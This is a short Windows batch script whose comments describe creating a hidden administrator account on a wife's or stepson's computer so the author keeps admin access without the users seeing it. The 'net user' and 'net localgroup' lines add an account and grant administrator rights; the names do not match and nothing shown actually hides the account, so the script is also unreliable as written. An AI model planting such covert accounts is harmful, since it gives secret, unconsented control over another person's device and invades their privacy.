@echo off 
REM makes a hidden user on pc for admin , hides from users. 
REM ie wife or stepsons's pc to admin when needed. but not be visible. ie like ./cool_admin... 
net user username pass /add 
net localgroup Administrators hidden /add